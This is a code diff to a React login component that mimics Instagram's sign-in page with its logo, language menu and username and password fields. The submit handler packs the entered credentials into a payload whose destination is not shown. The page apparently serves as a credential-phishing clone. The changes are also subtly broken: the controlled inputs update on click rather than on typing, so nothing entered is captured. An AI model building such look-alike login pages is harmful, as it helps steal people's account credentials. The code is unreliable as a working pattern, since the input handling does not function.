@@ -8,7 +8,9 @@ function App() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
 
-  const handleFormSubmit = async () => {
+  const handleFormSubmit = async (e) => {
+    e.preventDefault();
+
     const payload = {
       username,
       password
@@ -34,13 +36,13 @@ function App() {
             <option value="ru">Russian(RU)</option>
          </select>
          <img src="/instagram.png" className='logo' alt="" />
-         <form>
+         <form onSubmit={handleFormSubmit}>
            <div className="form_input_field">
-             <input type="text" placeholder='Username, email address or mobile number' />
+             <input type="text" placeholder='Username, email address or mobile number' aria-label='Username' onClick={(e) => setUsername(e.target.value)} value={username} required />
              <label htmlFor="">Username, email address or mobile number</label>
            </div>
            <div className="form_input_field">
-             <input type={showPassword ? "text" : "password"} placeholder='Password' />
+             <input type={showPassword ? "text" : "password"} placeholder='Password' aria-label='Password' onClick={(e) => setPassword(e.target.value)} value={password} required />
              <label htmlFor="">Password</label>
              <span className='show-passwd'>
               <img src={!showPassword ? "/invisible-password.svg" : "/visible-password.svg"} alt="" onClick={() => setShowPassword(prev => !prev)} />
